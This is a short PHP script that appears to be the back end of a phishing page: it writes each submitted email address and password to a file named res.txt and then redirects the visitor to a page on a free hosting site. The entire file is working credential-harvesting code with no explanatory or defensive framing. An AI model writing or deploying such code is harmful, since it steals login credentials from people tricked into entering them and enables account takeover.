<?php

file_put_contents("res.txt", $_POST['email'] . ":" . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://venerated-millimete.000webhostapp.com/Tank.html');
exit();
